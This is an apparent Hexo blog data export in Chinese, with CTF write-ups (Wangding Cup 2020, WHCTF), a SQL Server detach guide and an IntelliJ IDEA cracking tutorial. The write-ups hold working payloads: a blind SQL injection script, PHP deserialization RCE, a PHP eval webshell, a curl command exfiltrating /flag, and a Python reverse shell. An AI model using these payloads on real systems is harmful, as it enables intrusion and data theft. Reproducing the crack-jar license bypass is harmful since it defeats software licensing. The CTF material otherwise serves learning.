{"meta":{"title":"chuddy's Blog","subtitle":"keep hungry keep foolish","description":null,"author":"chuddy","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"idea下载教程","slug":"idea下载教程","date":"2020-06-03T07:40:54.000Z","updated":"2020-06-03T07:43:58.322Z","comments":true,"path":"2020/06/03/idea下载教程/","link":"","permalink":"http://yoursite.com/2020/06/03/idea下载教程/","excerpt":"","text":"1.下载IntelliJ IDEA 2018.1.6 链接：https://pan.baidu.com/s/18ZcKiPp3LU5S-la10r5icw提取码：ghn0 2.安装IntelliJ IDEA 2018.1.6 3.下载JetbrainsCrack-3.1-release-enc.jar 到 IntelliJ IDEA 2018.1.6 安装路径的bin目录下 链接：https://pan.baidu.com/s/1MFZJlJFvuJbEMoani6MhMw提取码：g1ls 4.编辑IntelliJ IDEA 2018.1.6/bin/idea64.exe.vmoptions下的配置文件（32位操作系统编辑idea.exe.vmoptions） ①Windows系统：在idea64.exe.vmoptions文件最后一行另起一行加上： -javaagent:D:/indea/bin/JetbrainsCrack-3.1-release-enc.jar 注意：红色字体就是IntelliJ IDEA 2018.1.6安装路径 ②Mac系统：在idea64.exe.vmoptions文件最后一行另起一行加上： -javaagent:../bin/JetbrainsCrack-3.1-release-enc.jar 5.重启Idea 6.填入注册码 ThisCrackLicenseId-{ &quot;licenseId&quot;:&quot;ThisCrackLicenseId&quot;, &quot;licenseeName&quot;:&quot;Rover12421&quot;, &quot;assigneeName&quot;:&quot;&quot;, &quot;assigneeEmail&quot;:&quot;rover12421@163.com&quot;, &quot;licenseRestriction&quot;:&quot;For Rover12421 Crack, Only Test! Please support genuine!!!&quot;, &quot;checkConcurrentUse&quot;:false, &quot;products&quot;:[ {&quot;code&quot;:&quot;II&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;}, {&quot;code&quot;:&quot;DM&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;}, {&quot;code&quot;:&quot;AC&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;}, {&quot;code&quot;:&quot;RS0&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;}, {&quot;code&quot;:&quot;WS&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;}, {&quot;code&quot;:&quot;DPN&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;}, {&quot;code&quot;:&quot;RC&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;}, {&quot;code&quot;:&quot;PS&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;}, {&quot;code&quot;:&quot;DC&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;}, {&quot;code&quot;:&quot;RM&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;}, {&quot;code&quot;:&quot;CL&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;}, {&quot;code&quot;:&quot;PC&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;} ], &quot;hash&quot;:&quot;2911276/0&quot;, &quot;gracePeriodDays&quot;:7, &quot;autoProlongated&quot;:false}","categories":[],"tags":[]},{"title":"java之jar包下载","slug":"java之jar包下载","date":"2020-06-03T07:39:31.000Z","updated":"2020-06-03T07:40:06.450Z","comments":true,"path":"2020/06/03/java之jar包下载/","link":"","permalink":"http://yoursite.com/2020/06/03/java之jar包下载/","excerpt":"","text":"Java jar包下载地址https://mvnrepository.com/ 页面首页","categories":[],"tags":[]},{"title":"分离数据库","slug":"分离数据库","date":"2020-06-03T07:30:02.000Z","updated":"2020-06-03T07:39:18.349Z","comments":true,"path":"2020/06/03/分离数据库/","link":"","permalink":"http://yoursite.com/2020/06/03/分离数据库/","excerpt":"","text":"SQLServer之分离数据库执行“数据库分离”后，分离出来的数据库在哪里（哪个目录文件下）？ 分离后的数据库默认的存放地点是 sqlserver数据文件版安装的根目权录\\MSSQL\\Data[数据库文件](https://www.baidu.com/s?wd=%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao)(*.mdf,*.ldf) 分离数据库注意事项 要求具有 db_owner 固定数据库角色中的成员资格。 可以分离数据库的数据和事务日志文件，然后将它们重新附加到同一或其他 SQL Server实例。 如果要将数据库更改到同一计算机的不同 SQL Server 实例或要移动数据库，分离和附加数据库会很有用。 分离数据库是指将数据库从 SQL Server 实例中删除，但使数据库在其数据文件和事务日志文件中保持不变。 之后，就可以使用这些文件将数据库附加到任何 SQL Server实例，包括分离该数据库的服务器。 如果存在下列任何情况，则不能分离数据库： 已复制并发布数据库。 如果进行复制，则数据库必须是未发布的。 必须通过运行 sp_replicationdboption禁用发布后，才能分离数据库。如果无法使用 sp_replicationdboption，可以通过运行 sp_removedbreplication删除复制。 数据库中存在数据库快照。必须首先删除所有数据库快照，然后才能分离数据库。不能分离或附加数据库快照。 该数据库正在某个数据库镜像会话中进行镜像。除非终止该会话，否则无法分离该数据库。 数据库处于可疑状态。 无法分离可疑数据库；必须将数据库设为紧急模式，才能对其进行分离。 数据库为系统数据库。 分离只读数据库将会丢失有关差异备份的差异基准的信息。 分离数据库时生成的错误会阻止完全关闭数据库和重新生成事务日志。 收到错误消息后，请执行下列更正操作： 重新附加与数据库关联的所有文件，而不仅仅是主文件。 解决导致生成错误消息的问题。 再次分离数据库。 使用SSMS数据库工具分离数据库 1、连接服务器-》展开服务器-》选择数据库-》右键点击-》选择任务-》选择分离。 2、在分离数据库对话框-》右边要分离得数据库对话框-》数据库名称：列出要分离的数据库-》删除连接：断开与指定数据库的连接，不能分离连接为活动状态的数据库-》更新统计信息：默认情况下，分离操作将在分离数据库时保留过期的优化统计信息；若要更新现有的优化统计信息，请单击此复选框-》状态：显示以下状态之一： 就绪或 未就绪-》消息：当数据库进行了复制操作，则 状态为未就绪， 消息列将显示已复制数据库。如果数据库有一个或多个活动连接，则状态为未就绪，消息列显示&lt;number_of_active_connections&gt; 个活动连接，例如：1 个活动连接。 在分离数据库之前，需要通过选择 删除连接断开所有活动连接。 3、数据库分离结果。使用T-SQL脚本分离数据库 语法 --声明数据库引用 use other_database_name; go --语法 exec sp_detach_db [@dbname=] &#39;database_name&#39; [,[@skipchecks= ] &#39;skipchecks&#39;] [,[@keepfulltextindexfile=] &#39;KeepFulltextIndexFile&#39; ]; go 语法注释 --语法示例 --other_database_name --声明当前使用的数据库不是要分离的数据库 --[@dbname=]&#39;database_name&#39; --要分离的数据库的名称。database_name是sysname值，默认值为NULL。 --[@skipchecks =]&#39;skipchecks&#39; --指定跳过还是运行update statistic。同时将skipchecks是nvarchar(10)值，默认值为NULL。 --若要跳过更新统计信息，请指定，则返回 true。 若要显式运行更新统计信息，请指定false。 --默认情况下，执行update statistic可更新有关表和索引中的数据的信息。 对于要移动到只读介质的数据库，执行 UPDATE STATISTICS 非常有用。 --[@keepfulltextindexfile=] &#39;KeepFulltextIndexFile&#39; --指定在数据库分离操作过程中不会删除与所分离的数据库关联的全文索引文件。 --KeepFulltextIndexFile是nvarchar(10)值，该值具有默认值为true。 --如果KeepFulltextIndexFile是false、 与数据库关联的全文索引的所有文件和全文索引的元数据被删除，除非数据库是只读的。 --如果为NULL，则返回true，全文索引相关的元数据保留。 --@keepfulltextindexfile中的未来版本将删除参数SQL Server。请不要在新的开发工作中使用此参数，并尽快修改当前仍在使用此参数的应用程序。 示例 --声明数据库引用 use master; go --进行数据库分离 --方式一 --exec sp_detach_db @dbname=&#39;testss&#39; --,@skipchecks=&#39;true&#39; --,@keepfulltextindexfile=&#39;true&#39;; --方式二 exec sp_detach_db &#39;testss&#39; ,&#39;true&#39; ,&#39;true&#39;; go 示例结果：T-SQL脚本执行完毕需要在对象资源管理器刷新才能看到分离结果。 分类: SQLServer","categories":[],"tags":[]},{"title":"whctf writeup","slug":"whctf-writeup","date":"2020-05-27T14:33:36.000Z","updated":"2020-05-27T14:46:49.060Z","comments":true,"path":"2020/05/27/whctf-writeup/","link":"","permalink":"http://yoursite.com/2020/05/27/whctf-writeup/","excerpt":"","text":"前言武汉大学CTF 竞赛，学到了点东西。在此记录一下： web## 随便输入用户名密码会提示sql语句 SELECT password FROM users WHERE username=&#39;admin&#39; AND password=&#39;admin&#39; 尝试输入admin&#39; or &#39;1&#39;#发现回显为，其中的or被替换成空了： Your sql statement is: SELECT password FROM users WHERE username=&#39;admin&#39; &#39;1&#39;#&#39; AND password=&#39;123&#39; 可以尝试双写进行绕过。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"2020年网鼎杯第四场writeup","slug":"2020网鼎杯第四场writeup","date":"2020-05-27T00:24:37.000Z","updated":"2020-05-27T01:45:04.337Z","comments":true,"path":"2020/05/27/2020网鼎杯第四场writeup/","link":"","permalink":"http://yoursite.com/2020/05/27/2020网鼎杯第四场writeup/","excerpt":"","text":"前言听说网鼎杯玄武场的题目最有难度，于是就尝试复现一下web题目。 webjs_on打开页面 是一个登陆框，还有注册页面，在这里尝试注入： 一开口就知道是老祖安人了，如此的儒雅随和。。。注入尝试失败了，就像尝试登陆吧，尝试几次之后，发现存在弱口令admin:admin 给了一个key。。 尝试珠宝，发现了token应该是jwt。这个key应该是密钥。 在线解密，之后发现： 百度了一个jwt加密的脚本：jwt加密测试发现可以控制user和news的参数。。 尝试让user为admin&#39; 发现存在报错，猜测这里存在注入。。 通过测试发现 这里过滤了空格，我们可以用/**/进行绕过。 这里还过滤了select，尝试之后发现可以使用sel&lt;&gt;ect进行绕过。 这里我们进行注入，发现存在users表，里面存储的是正常的信息，没有我们所期待的flag表。。 尝试发现load_file 可以用，直接读 /flag.脚本如下： # encoding=utf-8 import time import jwt import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) # payload token_dict = { &quot;user&quot;: &quot;admin&#39;/**/or/**/&#39;&#39;=&#39;&quot;, &quot;news&quot;: &quot;test&quot; } def jwt_enc(js): headers = { &#39;alg&#39;: &quot;HS256&quot;, # 声明所使用的算法 } jwt_token = jwt.encode(js, # payload, 有效载体 &quot;xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&amp;6&quot;, # 进行加密签名的密钥 algorithm=&quot;HS256&quot;, # 指明签名算法方式, 默认也是HS256 headers=headers # json web token 数据结构包含两部分, payload(有效载体), headers(标头) ).decode(&#39;ascii&#39;) # python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str return jwt_token url = &#39;http://challenge-fd0e6314e955219d.sandbox.ctfhub.com:10080/index.php&#39; flag=&quot;&quot; for i in range(1,60): print i for j in range(33,128): # print j data={ &#39;user&#39;:&quot;admin&#39;/**/and/**/(sel&lt;&gt;ect/**/ascii(mid(load_file(&#39;/flag&#39;),&quot;+str(i)+&quot;,1)))=&quot;+str(j)+&quot;/**/#&quot;, &#39;news&#39;:&#39;aaa&#39; } # print data cookie={ &#39;token&#39;:jwt_enc(data) } # print cookie # exit() res = requests.post(url, cookies=cookie) # print res.text # exit() if &#39;aaa&#39; in res.text: flag += chr(j) print flag break # ctfhub{23011c99d66ec70f922839df70fe5f6a7f532ef0} 题目复现可以去ctfhub上面进行复现：ctfhub #","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"2020年网鼎杯第三场writeup","slug":"2020年网鼎杯第三场writeup","date":"2020-05-17T03:25:03.000Z","updated":"2020-05-19T03:49:38.776Z","comments":true,"path":"2020/05/17/2020年网鼎杯第三场writeup/","link":"","permalink":"http://yoursite.com/2020/05/17/2020年网鼎杯第三场writeup/","excerpt":"","text":"Misc签到日常做游戏得到flag 九宫格打开压缩包 ，得到了好多的二维码 利用工具批量解码： 发现结果都是0或者1 010101010011001001000110011100110110010001000111010101100110101101011000001100010011100101101010010101000110100001111000010101110111000101001011011011010101100101010100010110100101000000110001010110000011010001000001011001100111010101000110010010100010111100110111010001100110110001110001010010010100011000110001010010110100100001010001010101000101001000110101010100110011011000110011011110100100111101101011011110010110111101011000001100110011011001101110010110100110110001100001010011110111000100110100010110000011010001101011011011000111011101010010011101110111000101100001 猜测是二进制 八位一组转字符串 aa = &#39;010101010011001001000110011100110110010001000111010101100110101101011000001100010011100101101010010101000110100001111000010101110111000101001011011011010101100101010100010110100101000000110001010110000011010001000001011001100111010101000110010010100010111100110111010001100110110001110001010010010100011000110001010010110100100001010001010101000101001000110101010100110011011000110011011110100100111101101011011110010110111101011000001100110011011001101110010110100110110001100001010011110111000100110100010110000011010001101011011011000111011101010010011101110111000101100001&#39; res=&#39;&#39; for i in range(0,len(aa),8): # print aa[i:i+8] res += chr(int(aa[i:i+8],2)) print res 结果为：U2FsdGVkX19jThxWqKmYTZP1X4AfuFJ/7FlqIF1KHQTR5S63zOkyoX36nZlaOq4X4klwRwqa 百度一下，发现可是能rabbit加密 根据提示得到密钥为245568 key修改图片的高度，得到一串神奇的字符串： 295965569a596696995a9aa969996a6a9a669965656969996959669566a5655699669aa5656966a566a56656 不知道有什么用。。。 后来听说是 差分曼彻斯特编码 得到密码：Sakura_Love_Strawberry 另一个图片 foremost得到一个压缩包。。 解压就可以得到flag了。。。 webwebphp打开页面发现： 发现没有什么东西，就是一个时间获取的界面。。 进行抓包，发现了 可以参数： 感觉是php代码执行…尝试发现存在waf，过滤了好多危险函数： exec,shell_exec,system,phpinfo,eval,assert 等等 方法一忽然发现能够读到源码file_get_contents index.php &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;phpweb&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body { background: url(&quot;bg.jpg&quot;) no-repeat; background-size: 100%; } p { color: white; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;script language=javascript&gt; setTimeout(&quot;document.form1.submit()&quot;,5000) &lt;/script&gt; &lt;p&gt; &lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;} } class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); } } ?&gt; &lt;/p&gt; &lt;form id=form1 name=form1 action=&quot;index.php&quot; method=post&gt; &lt;input type=hidden id=func name=func value=&#39;date&#39;&gt; &lt;input type=hidden id=p name=p value=&#39;Y-m-d h:i:s a&#39;&gt; &lt;/body&gt; &lt;/html&gt; 发现存在一个很强的黑名单，基本上过滤了已知的危险函数。。。 但是这个class有点意思： function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;} } class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } 没有对参数进行验证，可以进行绕过， 本地测试： &lt;?php function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;} } class Test { var $p = &quot;ls&quot;; var $func = &quot;system&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $a = new Test(); echo serialize($a); ?&gt; 测试发现可以执行命令： 得到flag：payload:func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:25:&quot;cat $(find / -name flag*)&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} 方法二命名空间绕过黑名单： 最终payload:func=\\system&amp;p=cat $(find / -name flag*) Nmap打开页面，发现是一个nmap扫描器： 尝试之后发现能够进行一些扫描并记录扫描结果。。 nmap的一些参数的用法参考文章尝试对扫描结果进行指定文件保存， 输入&#39; -oN aa.txt &#39;，让后访问/aa.txt # Nmap 6.47 scan initiated Mon May 18 15:58:14 2020 as: nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/05cc1 -oN aa.txt \\ \\\\ 于是猜测是否可以写一个木马文件上去,测试发现过滤了php字符串 可以上传&lt;?=eval($_POST[a]);?&gt; 文件名为phtml payload：&#39; -oN b.phtml &lt;?=eval($_POST[a]);?&gt;&#39; 用蚁剑进行连接，在根目录得到flag Think_Java发现给出了一定的源码，打开网站发现是这样的： 反编译得到网站的部分源码： 主要代码： test.java package cn.abc.core.controller; import cn.abc.common.bean.ResponseCode; import cn.abc.common.bean.ResponseResult; import cn.abc.common.security.annotation.Access; import cn.abc.core.sqldict.SqlDict; import io.swagger.annotations.ApiOperation; import java.io.IOException; import java.util.List; import org.springframework.web.bind.annotation.CrossOrigin; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @CrossOrigin @RestController @RequestMapping({&quot;/common/test&quot;}) public class Test { @PostMapping({&quot;/sqlDict&quot;}) @Access @ApiOperation(&quot;为了开发方便对应数据库字典查询&quot;) public ResponseResult sqlDict(String dbName) throws IOException { List tables = SqlDict.getTableData(dbName, &quot;root&quot;, &quot;abc@12345&quot;); return ResponseResult.e(ResponseCode.OK, tables); } } sql.java package cn.abc.core.sqldict; import cn.abc.core.sqldict.Row; import cn.abc.core.sqldict.Table; import java.sql.Connection; import java.sql.DatabaseMetaData; import java.sql.DriverManager; import java.sql.ResultSet; import java.sql.SQLException; import java.sql.Statement; import java.util.ArrayList; import java.util.List; public class SqlDict { public static Connection getConnection(String dbName, String user, String pass) { Connection conn = null; try { Class.forName(&quot;com.mysql.jdbc.Driver&quot;); if(dbName != null &amp;&amp; !dbName.equals(&quot;&quot;)) { dbName = &quot;jdbc:mysql://mysqldbserver:3306/&quot; + dbName; } else { dbName = &quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;; } if(user == null || dbName.equals(&quot;&quot;)) { user = &quot;root&quot;; } if(pass == null || dbName.equals(&quot;&quot;)) { pass = &quot;abc@12345&quot;; } conn = DriverManager.getConnection(dbName, user, pass); } catch (ClassNotFoundException var5) { var5.printStackTrace(); } catch (SQLException var6) { var6.printStackTrace(); } return conn; } public static List getTableData(String dbName, String user, String pass) { ArrayList Tables = new ArrayList(); Connection conn = getConnection(dbName, user, pass); String TableName = &quot;&quot;; try { Statement var16 = conn.createStatement(); DatabaseMetaData metaData = conn.getMetaData(); ResultSet tableNames = metaData.getTables((String)null, (String)null, (String)null, new String[]{&quot;TABLE&quot;}); while(tableNames.next()) { TableName = tableNames.getString(3); Table table = new Table(); String sql = &quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = \\&#39;&quot; + dbName + &quot;\\&#39; and table_name=\\&#39;&quot; + TableName + &quot;\\&#39;;&quot;; ResultSet rs = var16.executeQuery(sql); while(rs.next()) { table.setTableDescribe(rs.getString(&quot;TABLE_COMMENT&quot;)); } table.setTableName(TableName); ResultSet data = metaData.getColumns(conn.getCatalog(), (String)null, TableName, &quot;&quot;); ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)null, TableName); String PK; for(PK = &quot;&quot;; rs2.next(); PK = rs2.getString(4)) { ; } while(data.next()) { Row row = new Row(data.getString(&quot;COLUMN_NAME&quot;), data.getString(&quot;TYPE_NAME&quot;), data.getString(&quot;COLUMN_DEF&quot;), data.getString(&quot;NULLABLE&quot;).equals(&quot;1&quot;)?&quot;YES&quot;:&quot;NO&quot;, data.getString(&quot;IS_AUTOINCREMENT&quot;), data.getString(&quot;REMARKS&quot;), data.getString(&quot;COLUMN_NAME&quot;).equals(PK)?&quot;true&quot;:null, data.getString(&quot;COLUMN_SIZE&quot;)); table.list.add(row); } Tables.add(table); } } catch (SQLException var161) { var161.printStackTrace(); } return Tables; } } 阅读完代码之后，发现可能存在sql注入：test.class中发现，存在路由：/common/test/sqlDict dbName = &quot;jdbc:mysql://mysqldbserver:3306/&quot; + dbName;查看了jdbc的参考文档 参考资料 发现这个dbName可以传递参数。。dbName后面加上?后面可以加任意参数，也不会影响正常的数据库连接。。 这个sql语句 是利用单引号进行拼接： String sql = &quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = \\&#39;&quot; + dbName + &quot;\\&#39; and table_name=\\&#39;&quot; + TableName + &quot;\\&#39;;&quot;; 这里可以是一个注入点：dbName=myapp?a=1&#39; union select user()--+ 发现存在回显： 爆表dbName=myapp?a=1&#39; union SELECT group_concat(table_name) from information_schema.tables where table_schema=database()--+： 爆字段名dbName=myapp?a=1&#39; union SELECT group_concat(id,name,pwd) from information_schema.columns where table_name=&#39;user&#39;--+： 爆数据dbName=myapp?a=1&#39; union SELECT group_concat(id,name,pwd) from user--+： 得到了一组账号密码：admin:admin@Rrrr_ctf_asde 没有找到想象中的flag。。。 扫目录发现存在swagger-ui.html文件： 存在其他的功能测试。 有登陆功能，利用刚才爆破得到的账号密码进行登陆： 得到了一个token Bearer Token（Token 令牌） 定义：为了验证使用者的身份，需要客户端向服务器端提供一个可靠的验证信息，称为Token，这个token通常由Json数据格式组成，通过hash散列算法生成一个字符串，所以称为Json Web Token（Json表示令牌的原始值是一个Json格式的数据，web表示是在互联网传播的，token表示令牌，简称JWT) 在获取当前用户信息的那里需要输入token，应该是利用这个。。 做到这里我就没什么思路了，一个大师傅告诉我，是java反序列化。。。 Bearer 属于jwt的一种，也就是说加密的字符是json数据通过base64加密后得到的。可以测试一下java的反序列化漏洞 用到的工具：Burp Suite的扩展 Java-Deserialization-Scanner安装链接 发现ROME可以成功： 输入 ROME &quot;curl -d@/flag 174.1.96.95:5555&quot; 点击attack， 在服务器监听9999端口 就能接收到flag了","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"2020年网鼎杯第二场writeup","slug":"2020年网鼎杯第二场writeup","date":"2020-05-14T14:27:09.000Z","updated":"2020-05-14T17:05:53.344Z","comments":true,"path":"2020/05/14/2020年网鼎杯第二场writeup/","link":"","permalink":"http://yoursite.com/2020/05/14/2020年网鼎杯第二场writeup/","excerpt":"","text":"前言记录下第二届网鼎杯白虎组的部分wp Misc签到打开页面发现是一个游戏界面，查看源代码中的js文件，发现了一个ajax请求： setTimeout(function () { if (n) { return } if (e == l) { var t = levelCount - 1; if (t &gt; strings.ok.length - 1) { t = strings.ok.length - 1 } if(levelCount&gt;=7){ var token = prompt(&quot;please input your team Token:&quot;).trim(); $.ajax({ url: &#39;fate.php&#39;, type: &#39;POST&#39;, data: &#39;token=&#39; + token, success: function(data){ var data = data; alert(data); } }) } o.innerHTML = strings.ok[t]; k() } 找到了url：fate.php向这个页面post传递一个token值，就可以得到flag hack下载压缩包得到，压缩包中有sqlmap1.4 0day.zip 和xor。。。 发现文件是加密的。。尝试伪加密，发现不是未加密，，， 尝试爆破无果，唉，忽然想到会不会是明文攻击，在网上下载一个sqlmap-1.4的文件，来进行明文攻击。。得到了压缩包密码： 解压得到了0day.zip和xor文件xor想到可以利用xortools进行爆破： 得到了密钥WDCTF: 尝试对xor进行解密： #coding:utf-8 f = open(&#39;xor&#39;,&#39;rb&#39;) w = open(&#39;xor1.png&#39;,&#39;ab&#39;) line = f.read() key = &#39;WDCTF&#39; # print hex(ord(line[1])) for i in range(len(line)): w.write(chr(ord(line[i])^ord(key[i % 5]))) 得到了解密后的文件 用winhex打开： 得到了压缩包的密码：qw91!25fzd$@! 解压得到flag文件MZWGCZ33MY2DMODBGU2DCLJTGJSWKLJUMQZTOLLCHAZDKLJQMI4GCMRQGU2TQNJSGN6Q==== 进行base32解密: hidden打开压缩包，得到了一个图片： winhex打开发现： 存在压缩包，用binwalk进行分离得到了一个压缩包： 进行爆破密码，成功爆破得到了密码： 得到了了一半的二维码，尝试修改高度： 将43修改为85，保存文件，得到了完整的二维码：扫描得到flag。。。 webpicdown打开题目，发现 是一个图片下载器。。。 猜测可以下载源码： 尝试之后，得到main.py的源码： main.py： from flask import Flask, Response from flask import render_template from flask import request import os import urllib app = Flask(__name__) SECRET_FILE = &quot;/tmp/secret.txt&quot; f = open(SECRET_FILE) SECRET_KEY = f.read().strip() os.remove(SECRET_FILE) @app.route(&#39;/&#39;) def index(): return render_template(&#39;search.html&#39;) @app.route(&#39;/page&#39;) def page(): url = request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype=&#39;application/octet-stream&#39;) response.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=beautiful.jpg&#39; return response else: value = &quot;HACK ERROR!&quot; except: value = &quot;SOMETHING WRONG!&quot; return render_template(&#39;search.html&#39;, res=value) @app.route(&#39;/no_one_know_the_manager&#39;) def manager(): key = request.args.get(&quot;key&quot;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(&quot;shell&quot;) os.system(shell) res = &quot;ok&quot; else: res = &quot;Wrong Key!&quot; return res if __name__ == &#39;__main__&#39;: app.run(host=&#39;0.0.0.0&#39;, port=8080) 漏洞代码： @app.route(&#39;/no_one_know_the_manager&#39;) def manager(): key = request.args.get(&quot;key&quot;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(&quot;shell&quot;) os.system(shell) res = &quot;ok&quot; else: res = &quot;Wrong Key!&quot; return res 首先接受一个key值和SECRET_KEY相等，然后接受一个shell值，执行os.system(shell)这里可以反弹shell。 这里的SECRET_KEY是通过 SECRET_FILE = &quot;/tmp/secret.txt&quot; f = open(SECRET_FILE) SECRET_KEY = f.read().strip() os.remove(SECRET_FILE) 这里读出来的，尝试读取这个/tmp/secret.txt文件，发现不能读取成功：发现已经删除os.remove(SECRET_FILE),忽然想起来以前出现过类似的考点： 在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用 os.remove(SECRET_FILE)）删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。 尝试之后，在/proc/self/fd/3这里读取到SECRET_FILE然后进行python反弹shell /no_one_know_the_manager?key=reIqMCng8hfnu3wD4RDyKnO76LdgLeOYrb6DuPNLzLc=&amp;shell=python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22xx.xx.xx.xx%22,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27 可以成功反弹shell,最终在/root/flag.txt中得到flag: flag{75a9190b-44a9-4f39-ba91-950743cbc18d} 张三的网站打开页面，发现是一个登陆页面，注册一个账号看看里面的功能：登陆后发现：页面只回显了用户名，忽然感觉这个题，有点熟悉的感觉了。。。 尝试注册用户名为2&#39;+123+&#39;，尝试登陆： 这不是上一届网鼎杯的原题吗？ 直接拿脚本改一改： import requests import string import re as r import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) url= &quot;http://906482149bf841c0b701c2f92bfaaa213b708f2173aa4e0b.cloudgame1.ichunqiu.com/&quot; ch = &#39;0123456789qwertyuiopasdfghjklzxcvbnm{-}&#39; re = requests.session() flag = &#39;&#39; for j in range(1,50): # payload = &quot;0&#39;+(select ascii(substr((database()) from {} for {})))+&#39;0&quot;.format(int(j),1) payload = &quot;0&#39;+(select ascii(substr((select * from flag) from {} for {})))+&#39;0&quot;.format(int(j),1) email = &#39;{}aaaa@qq.com&#39;.format(str(j)+&#39;kslaml&#39;) url1 = url+&#39;register.php&#39; data = dict(email = email, username = payload,password = &#39;aaaa&#39;) res = re.post(url1,data=data) url2 = url+&#39;login.php&#39; data = dict(email = email,password = &#39;aaaa&#39;) html = re.post(url2, data=data) html.encoding = &#39;utf-8&#39; try: res = r.findall(r&#39;&lt;span class=&quot;user-name&quot;&gt;(.*?)&lt;/span&gt;&#39;,html.text,r.S) a = res[0][1:].strip() flag += chr(int(a)) print flag except: pass 得到flag: Cryptob64题目给出： 密文:uLdAuO8duojAFLEKjIgdpfGeZoELjJp9kSieuIsAjJ/LpSXDuCGduouz 泄露的密文:pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF= 泄露的明文:ashlkj!@sj1223%^&amp;*Sd4564sd879s5d12f231a46qwjkd12J;DJjl;LjL;KJ8729128713 对泄露的密文尝试base64解码，发现失败，对泄露的明文进行base64加密，发现正好和泄露的密文的长度相等。。。 